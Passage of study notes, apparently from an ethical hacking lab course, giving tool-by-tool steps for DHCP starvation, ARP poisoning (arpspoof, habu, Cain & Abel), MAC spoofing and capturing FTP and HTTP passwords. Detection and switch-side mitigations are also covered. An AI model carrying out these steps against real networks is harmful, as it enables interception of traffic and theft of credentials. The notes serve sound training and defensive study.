</p><ul id="5ec29bd9-9858-4234-a40d-8342fb60b303" class="bulleted-list"><li style="list-style-type:disc">In wireshark, this attack looks like a lot of DHCP discover requests from 0.0.0.0 to broadcast</li></ul><ul id="ba649766-dc7e-4156-b591-60ac9c8ade6f" class="bulleted-list"><li style="list-style-type:disc">Run yersinia<ul id="7be902e1-3af4-4087-be7d-90e36e18c6cb" class="bulleted-list"><li style="list-style-type:circle"><code>yersinia -I</code> runs in interactive mode</li></ul><ul id="0541007b-5775-49d6-9d35-e15624ab3792" class="bulleted-list"><li style="list-style-type:circle">Commands<ul id="26bc4e01-d036-4b0e-8a34-89e6818d9d47" class="bulleted-list"><li style="list-style-type:square"><code>h</code> shows help</li></ul><ul id="a36633bc-6355-4515-bdd3-b59ba046f017" class="bulleted-list"><li style="list-style-type:square"><code>q</code> exits menu if open</li></ul><ul id="859b1965-fa15-4916-9f15-2734baf6dec4" class="bulleted-list"><li style="list-style-type:square"><code>F2</code> goes into DHCP mode</li></ul><ul id="e59f5220-d92b-4ec6-b42b-bcafb44798b5" class="bulleted-list"><li style="list-style-type:square"><code>x</code> shows the attack options<ul id="424ac82e-89e0-4706-902e-758681c578a4" class="bulleted-list"><li style="list-style-type:disc">Press the corresponding number to select an option</li></ul><ul id="a69b331b-8fb8-499e-b8c0-06563295d35b" class="bulleted-list"><li style="list-style-type:disc">Yersinia will start sending DHCP packets</li></ul></li></ul><ul id="ee2f0ffb-7c38-41bc-91a0-eb9bba65cd1b" class="bulleted-list"><li style="list-style-type:square"><code>q</code> to stop yersinia</li></ul></li></ul></li></ul></details></li></ul><ul id="9fffe74b-58ce-4875-b794-69bb0fa9f24d" class="toggle"><li><details open=""><summary>Perform ARP Poisoning using arpspoof</summary><p id="1a4c09d6-904c-4e20-910b-c730392a4b53" class="">ARP spoofing is a method of attacking an Ethernet LAN. ARP spoofing succeeds by changing the IP address of the attacker’s computer to the IP address of the target computer</p><p id="96e00b72-6aca-49d4-8f65-e2f6ffd52025" class="">arpspoof redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies. </p><p id="c8453a18-b26f-4dae-ac64-5c5f1e14718d" class="">This is an extremely effective way of sniffing traffic on a switch.</p><ul id="58e5146a-2a3d-453c-bc0c-4aa5d25ca79a" class="toggle"><li><details open=""><summary>Mitigation Techniques Implemented by Modern Switches</summary><p id="2c943ea3-0e15-463f-9381-3373cb7f10c4" class="">Modern enterprise-grade switches have incorporated several mitigation techniques to combat ARP spoofing and other types of attacks. Some common methods include:</p><ol type="1" id="0ff02670-3a1c-41b9-b444-d0f6d14d68cf" class="numbered-list" start="1"><li><strong>Dynamic ARP Inspection (DAI)</strong>:<ul id="864e991f-c78d-4079-99f6-8dc841cf9939" class="bulleted-list"><li style="list-style-type:disc"><strong>Dynamic ARP Inspection (DAI)</strong> is a security feature that intercepts and inspects ARP packets, ensuring that only valid ARP requests and replies are relayed.</li></ul><ul id="cf56d56b-ea92-4052-9ca1-ed455029d23b" class="bulleted-list"><li style="list-style-type:disc"><strong>How It Works</strong>: DAI uses a trusted binding table, often generated from DHCP snooping or manually configured, to verify each ARP packet&#x27;s validity. If an ARP packet does not match an entry in the table, it is dropped.</li></ul><ul id="27691c58-feeb-4f28-b891-b40c2dce3d99" class="bulleted-list"><li style="list-style-type:disc"><strong>Supported By</strong>: Cisco, Juniper, HP/Aruba, and Extreme Networks switches, among others.</li></ul></li></ol><ol type="1" id="40aa8341-566b-4687-a96d-b0324189ad3b" class="numbered-list" start="2"><li><strong>Port Security</strong>:<ul id="54fe8770-5e7b-462e-9ed6-a5aa275ad39e" class="bulleted-list"><li style="list-style-type:disc">Port security allows network administrators to restrict the MAC addresses that can be learned on a specific port. By limiting the number of allowed MAC addresses per port, switches can prevent attackers from associating their MAC address with multiple IP addresses.</li></ul><ul id="f37cefd8-64a3-4e4a-8fb7-d24935d485c2" class="bulleted-list"><li style="list-style-type:disc"><strong>Supported By</strong>: Cisco, HP/Aruba, Juniper, and most other enterprise-grade switches.</li></ul></li></ol><ol type="1" id="ba5dfedd-1101-4be1-93f0-1605d6303e66" class="numbered-list" start="3"><li><strong>Static ARP Entries</strong>:<ul id="a4d1e35e-9ec8-41a3-852c-1bc248c110a5" class="bulleted-list"><li style="list-style-type:disc">Administrators can configure static ARP entries on key devices, such as routers and critical servers. This method ensures that these devices do not accept ARP replies that conflict with the static mappings.</li></ul><ul id="42b315d9-ae52-4f10-b3b5-e5a2c3334c38" class="bulleted-list"><li style="list-style-type:disc">While this is more a host-side mitigation than a switch-side, it is effective in critical parts of the network.</li></ul></li></ol><ol type="1" id="46c80aae-288d-4f38-b043-85bc34fdb774" class="numbered-list" start="4"><li><strong>VLAN Segmentation</strong>:<ul id="02b345b1-ec30-4fec-9150-a923946346df" class="bulleted-list"><li style="list-style-type:disc">Network segmentation using VLANs can help isolate sensitive devices or groups of devices, reducing the broadcast domain size and limiting the effectiveness of ARP spoofing attacks.</li></ul></li></ol></details></li></ul><p id="97457c05-ed1d-4a84-b983-0c4aa4153340" class="">
</p><ul id="4004ed83-bb57-4ea4-88da-1e223e262360" class="bulleted-list"><li style="list-style-type:disc">In wireshark, you can see broadcast requests and responses from our side<ul id="93e45df3-b2bc-492a-b07d-18219300d0af" class="bulleted-list"><li style="list-style-type:circle">The responses also show that a duplicate is identified</li></ul></li></ul><ul id="c19da0c4-42a1-4f08-8e61-e3d188838745" class="bulleted-list"><li style="list-style-type:disc">Run <code><strong>arpspoof -i eth0 -t &lt;gateway&gt; &lt;target&gt;</strong></code><ul id="43266a0c-2018-43d6-a4d8-c23134bff116" class="bulleted-list"><li style="list-style-type:circle"><code>-i</code> speficies the network interface</li></ul><ul id="fca4c40c-f03e-40ba-a33e-23e8af7906b1" class="bulleted-list"><li style="list-style-type:circle"><code>-t</code> spefidies the target IP address</li></ul><ul id="eb496dbc-3975-4e64-b831-1443f55c560d" class="bulleted-list"><li style="list-style-type:circle">Issuing the above command informs the access point that the target system has our MAC address. In other words, we are informing the access point that we are the target system.</li></ul></li></ul><ul id="558e4f6f-3a0a-4412-92dc-678ef23cfa03" class="bulleted-list"><li style="list-style-type:disc">Attackers use the arpspoof tool to obtain the ARP cache; then, the MAC address is replaced with that of an attacker’s system. Therefore, any traffic flowing from the victim to the gateway will be redirected to the attacker’s system.</li></ul></details></li></ul><ul id="c2614f57-fda3-44cd-9f86-5e7dfd2404de" class="toggle"><li><details open=""><summary>Perform ARP Poisoning using habu</summary><ul id="dfcf14d6-f20b-435e-bf94-ba06717b3846" class="bulleted-list"><li style="list-style-type:disc"><code>habu.arp.poison &lt;victim ip&gt;  &lt;redirect ip&gt;</code></li></ul><ul id="9e0e20cd-5e00-49b6-8785-534719ed81f5" class="bulleted-list"><li style="list-style-type:disc">The above command sends ARP <strong>&#x27;is-at&#x27;</strong> packets to the specified victim(s), poisoning their ARP tables to send their traffic to the attacker system.<br/><br/></li></ul></details></li></ul><ul id="5adc5220-129f-4544-8493-9557f7d1e059" class="toggle"><li><details open=""><summary>Perform MITM using Cain &amp; Abel</summary><p id="cc4b885f-c2b7-4771-afaf-660efc565679" class="">Cain &amp; Abel is a password recovery tool that allows the recovery of passwords by sniffing the network and cracking encrypted passwords.</p><p id="669e45b6-4f7c-4330-919a-a58d6495a49a" class="">The ARP poisoning feature of the Cain &amp; Abel tool involves sending free spoofed ARPs to the network’s host victims. </p><p id="944c4629-9dfd-4dda-9882-e71f0b7efc18" class="">This spoofed ARP can make it easier to attack a middleman.</p><p id="abcc49d0-1534-41b2-92eb-5c11faeef2d5" class="">
</p><ul id="8aa971a7-50d2-4bcb-a7a6-10b99417c9b4" class="bulleted-list"><li style="list-style-type:disc">In this example, we will use ARP poisoning to redirect packets our way, so that we are able to sniff the FTP password</li></ul><ul id="5d2c53d5-469e-4ea3-a033-e774266071ad" class="bulleted-list"><li style="list-style-type:disc">Open <code>Cain &amp; Abel</code> (can be found in <code>GDrive/Learning/Hacking Courses/Hacktools/cain20.exe</code>)</li></ul><ul id="72dbe154-7ddc-4a05-ac06-fd9e89bc9648" class="bulleted-list"><li style="list-style-type:disc">Start sniffing<ul id="0f40f70d-3419-42e7-831d-fe0e9f407407" class="bulleted-list"><li style="list-style-type:circle">Click <code>Configure</code> to set the network adapter and click OK</li></ul><ul id="576b5bb7-03c0-4933-9a41-95c3ade8a04c" class="bulleted-list"><li style="list-style-type:circle">Click to <code>Start/Stop Sniffer</code>  (button next to open folder) <ul id="b0961e91-9962-47a5-ac01-d87884b9aea7" class="bulleted-list"><li style="list-style-type:square">Click OK on the message</li></ul></li></ul></li></ul><ul id="443eb951-0f10-4f5d-91b8-85f693274d0c" class="bulleted-list"><li style="list-style-type:disc">Scan and find all the mac addresses in the network<ul id="3a0df755-4927-4298-a738-f93455bd73d7" class="bulleted-list"><li style="list-style-type:circle">Click on the <code>Sniffer</code> tab</li></ul><ul id="d6f708d7-1908-41e6-846e-94b3b7685df1" class="bulleted-list"><li style="list-style-type:circle">Click the big blue <code>Plus</code> icon to scan mac addresses<ul id="81399645-4493-40a4-88f7-06ba4e9e3011" class="bulleted-list"><li style="list-style-type:square">Select <code>All hosts in my subnet</code></li></ul><ul id="fb021291-d40e-43b5-b16d-a5e206e0b476" class="bulleted-list"><li style="list-style-type:square">Select <code>All Tests</code></li></ul><ul id="b71a4715-9209-4ad4-aa5f-7888bdfdd602" class="bulleted-list"><li style="list-style-type:square">Click <code>OK</code></li></ul></li></ul></li></ul><ul id="80892d5d-c911-4723-a218-3fc1cb7b553d" class="bulleted-list"><li style="list-style-type:disc">Start ARP poisoning<ul id="de1a509f-e2f7-4c3b-883d-620bd46b12ff" class="bulleted-list"><li style="list-style-type:circle">On the <code>Sniffer</code> tab</li></ul><ul id="836c676f-903c-4569-bad6-4f619d520aca" class="bulleted-list"><li style="list-style-type:circle">Click on the <code>APR</code> tab on the botton<ul id="0dc55418-47e5-421d-99f8-1f023f2f944e" class="bulleted-list"><li style="list-style-type:square">Click  anywhere on the topmost righ handed section to enable the plus icon</li></ul><ul id="04b5c870-9cc5-401d-bff1-30b256020900" class="bulleted-list"><li style="list-style-type:square">Click the <code>Plus</code> icon</li></ul><ul id="10e96dce-3af6-4749-ba5f-81c0aa9b786d" class="bulleted-list"><li style="list-style-type:square">On the window, choose the address to poison</li></ul><ul id="0f2c9641-24fd-45dd-9b8c-f1b8dcf3725d" class="bulleted-list"><li style="list-style-type:square">On the left (after choosing) choose the target to redirect traffic (our pc)<ul id="ba98d4b8-4a32-4e78-8435-832151200016" class="bulleted-list"><li style="list-style-type:disc">not 100% which is which</li></ul></li></ul><ul id="35e36be2-ce4a-4926-aae8-3a990634329e" class="bulleted-list"><li style="list-style-type:square">Click <code>OK</code></li></ul></li></ul><ul id="fce68d6f-1ffb-4a26-b299-c8e11a11a140" class="bulleted-list"><li style="list-style-type:circle">Click on the <code><strong>Start/Stop APR</strong></code> icon (two buttons next to open folder) to start capturing ARP packets. <ul id="e5591749-9d6e-4870-b9b1-4724d16bcbe6" class="bulleted-list"><li style="list-style-type:square">The <strong>Status</strong> will change from <strong>Idle</strong> to <strong>Poisoning</strong></li></ul></li></ul></li></ul><ul id="7dca03cb-0f96-40dc-813a-3b5839c970c4" class="bulleted-list"><li style="list-style-type:disc">Capture credentials<ul id="0bd41f53-79c4-47d7-b052-e7636c4d353d" class="bulleted-list"><li style="list-style-type:circle">On target machine, connect to an FTP server and put credentials</li></ul><ul id="5b6e2867-4b6e-47b7-ac9b-50432b34e666" class="bulleted-list"><li style="list-style-type:circle">In <code>Cain</code>  go to the <code>Sniffer -&gt; Passwords</code>  tab on the bottom</li></ul><ul id="7bed9866-0b65-4762-bb2c-07bb87d75d2b" class="bulleted-list"><li style="list-style-type:circle">Will show captured passwords for each protocol (left hand side shows protocol)</li></ul></li></ul><p id="c4cd1817-2250-4db4-bce5-bc5dd54d9ae8" class="">
</p></details></li></ul><ul id="f0ee0341-0edd-46be-bcd6-e01003fbf810" class="toggle"><li><details open=""><summary>Spoof a MAC Address using TMAC</summary><p id="4b6071ed-c10e-4d83-b166-f8f9b0dd3a29" class="">In this attack, the attacker first retrieves the MAC addresses of clients who are actively associated with the switch port. </p><p id="dea069b8-72c6-49e2-bc51-9e37e0423a4b" class="">Then, the attacker spoofs their own MAC address with the MAC address of the legitimate client. Once the spoofing is successful, the attacker receives all traffic destined for the client. </p><p id="df19aced-5a9b-4713-bbac-8f179ce051f0" class="">Thus, an attacker can gain access to the network and take over the identity of a network user.</p><p id="a5f77639-9dd1-4589-9dd0-99c4bf1a8802" class="">
</p><ul id="fd9af01a-c398-47d0-8f83-5fd31f801b94" class="bulleted-list"><li style="list-style-type:disc">Open <code>TMAC</code> (can be found in <code>GDrive/Hacking Courses/Hacktools</code>)</li></ul><ul id="fadf25e3-968e-4a43-8644-3bb2a6d1da46" class="bulleted-list"><li style="list-style-type:disc">Choose an Ethernet Adapter</li></ul><ul id="d3739eda-4868-4f82-b240-9a30457291e6" class="bulleted-list"><li style="list-style-type:disc">Click <code>Random MAC Address</code></li></ul><ul id="39db4127-c3ed-4839-bed3-f6ff6d31f017" class="bulleted-list"><li style="list-style-type:disc">Click <code>Change Now</code></li></ul></details></li></ul><ul id="7b03961d-0d59-4928-b894-cc6c2be39c9c" class="toggle"><li><details open=""><summary>Spoof a MAC Address of Linux Machine using macchanger</summary><ul id="d9156064-1458-4aa7-b7c9-0f59d1ba7830" class="bulleted-list"><li style="list-style-type:disc">Print current mac<ul id="11dcd12b-be17-48b2-adc4-9e1d58dea307" class="bulleted-list"><li style="list-style-type:circle"><code>macchanger -s eth0</code></li></ul></li></ul><ul id="04f4ef74-ba9b-4064-aae5-55bead1e5646" class="bulleted-list"><li style="list-style-type:disc">Create a new random mac<ul id="883ff207-2c91-4b0c-84f1-10caa5bcd9c6" class="bulleted-list"><li style="list-style-type:circle"><code>macchanger -a eth0</code></li></ul></li></ul><ul id="bfd502d1-02f2-4d94-aa1e-d2e7cc7e0ee1" class="bulleted-list"><li style="list-style-type:disc">Apply new mac<ul id="003d3401-470e-476d-81e0-81f33f6ba3b4" class="bulleted-list"><li style="list-style-type:circle"><code>ifconfig eth0 down</code></li></ul><ul id="336ba858-d852-417c-a19a-07802bb3957e" class="bulleted-list"><li style="list-style-type:circle"><code>macchanger -r eth0</code></li></ul><ul id="1174faed-087b-4034-9e0c-f204e78bb765" class="bulleted-list"><li style="list-style-type:circle"><code>ifconfig eth0 up</code></li></ul></li></ul></details></li></ul></details></li></ul><ul id="bce3338d-4724-459e-9481-bcc38916e5c8" class="toggle"><li><details open=""><summary>Network Sniffing</summary><p id="8ab1e6a1-18fc-4cd0-84b8-2a5e754f7d51" class="">The traffic obtained by the attacker might contain sensitive information such as login credentials, which can then be used to perform malicious activities such as user-session impersonation.</p><p id="4a15f0f8-8daf-4f03-a60c-66ea0c324feb" class="">
</p><ul id="d3017b97-b8bc-441b-8cd8-bfe7f062186e" class="toggle"><li><details open=""><summary>Password Sniffing using Wireshark</summary><ul id="7c0ff115-5555-47fc-9adb-71c2fac638b9" class="bulleted-list"><li style="list-style-type:disc">Filter POST requests <code>http.request.method == POST</code></li></ul><ul id="a0ac5010-9d0d-4abe-84b0-7e1dd7fd54df" class="bulleted-list"><li style="list-style-type:disc">Find raw passwords<ul id="6cb7dd75-4bf1-4902-a6ee-0a11971cd743" class="bulleted-list"><li style="list-style-type:circle"><code>Ctrl+F → Search for String → type pwd, password etc</code></li></ul></li></ul><ul id="595f2ab9-9b29-448a-95b8-a7f2ead5bc46" class="bulleted-list"><li style="list-style-type:disc">Remote packet capture<ul id="86d8da11-4470-48b5-ac43-96bcee126c2d" class="bulleted-list"><li style="list-style-type:circle">On target machine, start the service named <code>Remote Packet Capture Protocol</code></li></ul><ul id="f8f8507d-b1a9-4526-9289-92144b43e617" class="bulleted-list"><li style="list-style-type:circle">In observer machine, go to <code>Wireshark -&gt; Capture Options -&gt; Manage Interfaces</code><ul id="f535bfe8-4ab1-4826-ba04-bbb97397a0af" class="bulleted-list"><li style="list-style-type:square">Click <code>Add a remote host (plus sign)</code></li></ul><ul id="3fc8cb39-e14c-4ff6-8f25-6fcd61bbe5d9" class="bulleted-list"><li style="list-style-type:square">Type the IP address, port 2002 and credentials and click OK</li></ul><ul id="2900aaa0-7b86-4f4c-8b2a-b925457c503d" class="bulleted-list"><li style="list-style-type:square">Select the adapter and Click <code>Start</code></li></ul></li></ul></li></ul></details></li></ul><ul id="f8768ea2-752f-4cdd-8b6f-424345807477" class="toggle"><li><details open=""><summary>Analyze a Network using the Omnipeek and Riverbed Network Protocol Analyzers</summary><ul id="42950999-0d07-465c-8b90-8bf019ccf486" class="bulleted-list"><li style="list-style-type:disc">They are tools like wireshark but shows alot of statistics on protocols, sites visited and request for each source, details on packets etc</li></ul><ul id="04ce9b3e-7bb2-4585-93d7-66dd2593f050" class="bulleted-list"><li style="list-style-type:disc">No free trial available</li></ul></details></li></ul></details></li></ul><ul id="09bccaa8-635e-4621-993d-16a561c2a896" class="toggle"><li><details open=""><summary>Detect Network Sniffing</summary><ul id="e12de323-5545-4ff5-8073-41decd5a459b" class="toggle"><li><details open=""><summary>Detect ARP Poisoning and Promiscuous Mode in a Switch-Based Network</summary><p id="658d4684-462f-4925-9293-4c1e5c437703" class="">Here, we will detect ARP poisoning in a switch-based network using Wireshark and we will use the Nmap Scripting Engine (NSE) to check if a system on a local Ethernet has its network card in promiscuous mode.</p><p id="eb9407ab-4bf7-4075-9263-f900b6b2d951" class="">We detect ARP poisoning by monitoring duplicate IP addresses</p><p id="7dc92032-a292-4b01-bfe7-818607b146a3" class="">
</p><ul id="82e5b524-4451-4699-88a0-98271246b480" class="toggle"><li><details open=""><summary>Start ARP poisoning using Cain</summary><ul id="7660adf4-cbed-42d1-8342-166b0a1e06a7" class="bulleted-list"><li style="list-style-type:disc">Start <code>Cain</code></li></ul><ul id="a76d466b-5f18-4168-bfd0-7d21b2843d95" class="bulleted-list"><li style="list-style-type:disc">Choose your adapter <code>Configure -&gt; Select Adapter -&gt; OK</code></li></ul><ul id="19c48815-5a94-40b8-8b3f-aa9a3d83c904" class="bulleted-list"><li style="list-style-type:disc">Click <code>Start/Stop Sniffer</code> (next to open file)<ul id="176b1faa-efac-4b9d-9e29-1bcaff1078b7" class="bulleted-list"><li style="list-style-type:circle">Click <code>OK</code> on warning</li></ul></li></ul><ul id="e2b79605-c2fe-4b9c-8519-5f4a582a6467" class="bulleted-list"><li style="list-style-type:disc">Scan MACs to select one for poison<ul id="ed144f0b-8506-42b3-8d33-112ae638023e" class="bulleted-list"><li style="list-style-type:circle">Click <code>Sniffer</code> tab</li></ul><ul id="7c004396-8447-4bc8-950a-c5f1cdf32f2a" class="bulleted-list"><li style="list-style-type:circle">Click the <code>Plus</code> icon</li></ul><ul id="f6404fa8-1565-4bef-a79d-e5e06d830e1c" class="bulleted-list"><li style="list-style-type:circle">Select <code>All Tests</code> and click <code>OK</code><ul id="a48a205e-7868-4785-b3c7-e62855c3f74c" class="bulleted-list"><li style="list-style-type:square">It will scan the net for mac addresses using the selected tests</li></ul></li></ul></li></ul><ul id="62b7dd4f-6fbc-491c-b2c1-f78daf5e50fb" class="bulleted-list"><li style="list-style-type:disc">ARP Poison<ul id="7e019512-b02a-47c1-8fb0-36658aed3404" class="bulleted-list"><li style="list-style-type:circle">Select the <code>APR</code> tab on the bottom</li></ul><ul id="59dfb572-a299-4bf9-bfcc-ab4eb46e0b88" class="bulleted-list"><li style="list-style-type:circle">Click on the upper right empty list</li></ul><ul id="21876218-55d9-4188-87e4-f02335c55ebf" class="bulleted-list"><li style="list-style-type:circle">Click the <code>Plus</code> icon</li></ul><ul id="575b8469-f430-4bdb-a717-f88d2aff5228" class="bulleted-list"><li style="list-style-type:circle">Select the first IP as source, and the second IP for target redirect</li></ul><ul id="bfce8fc9-61b2-4ccf-899b-4cadf5420d12" class="bulleted-list"><li style="list-style-type:circle">Click <code>OK</code></li></ul><ul id="af5aed8c-685a-40b2-adf9-5bbd24ab7042" class="bulleted-list"><li style="list-style-type:circle">Click <code>Start/Stop APR</code> (second next to open folder)</li></ul></li></ul><p id="eed723cd-47b1-4ee5-816f-d1f71d418b9f" class="">
</p></details></li></ul><ul id="97848ca8-e3e2-4ce4-a580-267d8d86e9a7" class="toggle"><li><details open=""><summary>Generate some traffic so that duplicates can be seen on network</summary><ul id="72bf36f5-93b7-47e7-a988-d719aa7474d6" class="bulleted-list"><li style="list-style-type:disc">Go to either source or target machine</li></ul><ul id="dbee34fe-7ea0-4362-a9f4-a8bf50fc0662" class="bulleted-list"><li style="list-style-type:disc"><code>hping3 &lt;ip&gt; -c 10000</code><ul id="4f285890-b378-43d9-8c98-3a0ed3c4a673" class="bulleted-list"><li style="list-style-type:circle">Generates 10000 pings</li></ul></li></ul></details></li></ul><ul id="defa89bb-7b29-4a42-9c34-97ddc20dc9b3" class="toggle"><li><details open=""><summary>Detect the ARP poisoning using wireshark</summary><ul id="69b9344c-b581-4c8f-9dc1-8132eda6c548" class="bulleted-list"><li style="list-style-type:disc">Open <code>Wireshark</code> </li></ul><ul id="8f74da7b-3ea3-4c9a-8933-065bb10e15ae" class="bulleted-list"><li style="list-style-type:disc">Enable ARP Storms and Duplicate IP detection<ul id="e0f71707-d11f-4106-bc71-bce265e1d139" class="bulleted-list"><li style="list-style-type:circle">Go to <code>Edit -&gt; Preferences</code></li></ul><ul id="8dd108b0-232b-4f31-bd72-7939e4a7c81b" class="bulleted-list"><li style="list-style-type:circle">Expand <code>Protocols</code> and find <code>ARP/RARP</code></li></ul><ul id="d29a64b2-9bb9-41d1-bf17-b431378ba9e7" class="bulleted-list"><li style="list-style-type:circle">Check <code>Detect ARP request storms</code></li></ul><ul id="f34f3b46-4a1e-4ca0-9c0e-a17cc3767248" class="bulleted-list"><li style="list-style-type:circle">Check <code>Detect duplicate IP address configuration</code></li></ul></li></ul><ul id="90dbafac-fefa-427b-8495-9c6ce88743e1" class="bulleted-list"><li style="list-style-type:disc">Start capturing with wireshark<ul id="f9dcfa6d-f4cc-492e-bdbb-52121724b409" class="bulleted-list"><li style="list-style-type:circle">Note: <code>Cain</code> will also shoe the number of packets flowing</li></ul></li></ul><ul id="c986bc42-8c6d-4349-9a3b-f68f2932739f" class="bulleted-list"><li style="list-style-type:disc">Stop the capture</li></ul><ul id="ea63613c-fdaf-4f0b-89dd-899e8f587cab" class="bulleted-list"><li style="list-style-type:disc">Go to <code>Analyze -&gt; Expert Information</code></li></ul><ul id="8e889f37-ef33-4253-8e6b-9e45f9f9992b" class="bulleted-list"><li style="list-style-type:disc">Should show <code>Duplicate IP address configured</code><ul id="d0e847bb-2268-477d-94e8-dcc189e02d63" class="bulleted-list"><li style="list-style-type:circle">The duplicate IP is the ARP poisoner’s ip</li></ul></li></ul><ul id="21e307ff-ecbe-4f4a-9691-ee37153d0339" class="bulleted-list"><li style="list-style-type:disc">If you expand and select a packet, it will select the packet in the prevvious window</li></ul></details></li></ul><ul id="40fdcc4f-190d-4a64-ac5f-8628b7e394af" class="toggle"><li><details open=""><summary>Detect using nmap</summary><ul id="0bc478bf-f0b5-4372-bc6d-2b576d263b30" class="bulleted-list"><li style="list-style-type:disc">Run <code>nmap --script=sniffer-detect &lt;target&gt;</code></li></ul><ul id="159af953-b99e-4fee-bf85-f2751dec27ce" class="bulleted-list"><li style="list-style-type:disc">It should say <code>|_sniffer_detect: Likely in promiscuous mode</code></li></ul><ul id="bac70873-978f-45d0-a76b-58bcf7316756" class="bulleted-list"><li style="list-style-type:disc">But I tried it on other targets and it says the same</li></ul></details></li></ul></details></li></ul><ul id="49d8699c-1273-43f5-9a56-70588b19e77e" class="toggle"><li><details open=""><summary>Detect ARP Poisoning using the Capsa Network Analyzer</summary><p id="168514a2-9532-47a6-801f-6fb92f45e494" class="">Capsa, a portable network performance analysis and diagnostics tool, provides packet capture and analysis capabilities</p><p id="4c7c9c07-787b-4b74-8163-04508cf55161" class="">Can detect ARP poisoning and ARP flooding attack and  locate attack source</p><p id="545306b8-15be-4613-94cd-2c9f15232305" class="">Habu is an open source penetration testing toolkit that can perform various tasks such as ARP poisoning, ARP sniffing, DHCP starvation and DHCP discovers.</p><p id="7edccbce-691d-42bd-96b4-f87fbbbde42a" class="">
</p><ul id="96c08b12-9fb5-4bdd-9c8d-dbc9aad5464a" class="toggle"><li><details open=""><summary>Install and run Capsa Network Analyzer</summary><ul id="39fcf5d9-5840-4531-8076-7551f06d4b14" class="bulleted-list"><li style="list-style-type:disc">Go to <code><strong>colasoft.com/download/products/capsa.php</strong></code><strong> </strong></li></ul><ul id="c1387a06-b867-48bc-9126-e00a34faa64d" class="bulleted-list"><li style="list-style-type:disc">Download the trial and install it</li></ul><ul id="60abb96e-d8e8-47e7-bc4b-b00c3474e54b" class="bulleted-list"><li style="list-style-type:disc">Use the email received to add the trial serial key during installation</li></ul></details></li></ul><ul id="85766f6e-ecd8-40ed-9efd-f9c694d97d9c" class="toggle"><li><details open=""><summary>Run ARP Spoofing to demonstrate detection by Caspsa</summary><p id="5696f171-d8a0-4997-9ccf-b3479557ade3" class=""><code>habu.arp.poison 10.10.1.11 10.10.1.13</code></p></details></li></ul><ul id="4b925363-907d-4c48-ad7d-4d16c06a3a15" class="toggle"><li><details open=""><summary>Using Capsa Network Analyzer</summary><ul id="0c8ce506-e3b1-4995-a979-04661e06809c" class="bulleted-list"><li style="list-style-type:disc">Select <code>Ethernet</code> card and click <code>Start</code></li></ul><ul id="835fadfb-44d3-4169-bcd1-d243b64cb74b" class="bulleted-list"><li style="list-style-type:disc">Capture ARP Poisoning<ul id="de72dbc7-4356-4262-99b7-c6247ae97d7d" class="bulleted-list"><li style="list-style-type:circle">Go to the <code>Diagnosis</code> screen (select it on the side panel)</li></ul><ul id="b73df93f-2aa4-4775-b96d-3931f4b6e9bd" class="bulleted-list"><li style="list-style-type:circle">It shall show an alert <code>ARP Too many Unrequested Replies</code></li></ul></li></ul><ul id="1efdfa2e-d626-4198-a7c4-4a90f70aba30" class="bulleted-list"><li style="list-style-type:disc">Resolve Issue<ul id="283ad076-6833-43ad-b962-ce208aaaa5d6" class="bulleted-list"><li style="list-style-type:circle">On the <code>Details</code> section below, select he alert<ul id="a3c2fac4-e7ec-4403-9e58-68e164546f16" class="bulleted-list"><li style="list-style-type:square"><code>Right Click -&gt; Resolve Address....</code></li></ul><ul id="37ac86da-8cc1-4d1c-9d81-fe5b9e0a2274" class="bulleted-list"><li style="list-style-type:square">It will identify the valid address</li></ul></li></ul></li></ul><ul id="38ade8df-62f7-4b4e-a0ee-ed08b2f0e74f" class="bulleted-list"><li style="list-style-type:disc">Read behavior and packets on diagnosed targets<ul id="d6bd9a46-1331-4d4d-9fa4-35dbad3a128f" class="bulleted-list"><li style="list-style-type:circle">In the <code>Diagnosis</code> page</li></ul><ul id="88438df9-a23e-414e-a7cd-06bc27b93600" class="bulleted-list"><li style="list-style-type:circle">Click on <code>All diagnosis</code></li></ul><ul id="6908c923-4828-4f40-a5f7-2dfc973d8640" class="bulleted-list"><li style="list-style-type:circle">Double click on <code>target IP address</code></li></ul><ul id="5c0fa1dd-85c3-42be-8aa6-0dcd5ec4609a" class="bulleted-list"><li style="list-style-type:circle">You can see a tab on <code>Behavior</code> and a tab on <code>Packets</code></li></ul></li></ul><ul id="5479efbe-a94e-49d5-8070-d9167b3368da" class="bulleted-list"><li style="list-style-type:disc">Create log files out of diagnosis<ul id="fbb36e1b-c769-4544-888b-4d36746666ef" class="bulleted-list"><li style="list-style-type:circle">Go to <code>Analysis Settings(N) -&gt; Diagnosis</code> (top left)</li></ul><ul id="8675a904-7b87-4807-a9dc-e2d41f091882" class="bulleted-list"><li style="list-style-type:circle">On the left tick <code>Diagnosis</code> and <code>Log Output</code></li></ul><ul id="7f69e517-9f26-4dad-94fc-9ff6ac0349e5" class="bulleted-list"><li style="list-style-type:circle">Click on <code>Log Output</code></li></ul><ul id="b1c5ace7-e5bc-411d-a41e-fdbf64595358" class="bulleted-list"><li style="list-style-type:circle">Select a <code>file path</code></li></ul><ul id="5a2b1613-8da9-473e-a1cc-289cd669dcbc" class="bulleted-list"><li style="list-style-type:circle">Select <code>csv file</code></li></ul><ul id="ae0b070d-164f-42e4-a28e-7a925dbe761f" class="bulleted-list"><li style="list-style-type:circle">Click <code>OK</code></li></ul></li></ul></details></li></ul><p id="cd2e438d-8c39-4a8b-b2fc-0fc1cd0120c3" class="">
</p><p id="c3e7f430-7297-4683-8e23-6b95f6ea6578" class="">
</p></details></li></ul></details></li></ul></details></li></ul><ul id="aff366e2-ec71-4103-a678-611867d7769f" class="toggle"><li><details open=""><summary>Lab 8 - Social Engineering</summary><p id="ce781337-7e50-4cf8-80af-2ef846d516c8" class="">The Social-Engineer Toolkit (SET) is an open-source Python-driven tool aimed at penetration testing via social engineering. </p><p id="78d05407-6e0c-4a6b-a726-10e438a05fc8" class="">Ιt allows attackers to draft email messages, attach malicious files, and send them to a large number of people using spear phishing.</p><p id="e52f3e44-cb0a-4e6a-a371-5619b9af9a3b" class="">Moreover, SET’s multi-attack method allows Java applets, the Metasploit browser, and Credential Harvester/Tabnabbing to be used simultaneously.</p><p id="db4a73ea-1113-4722-8878-195488e18242" class="">
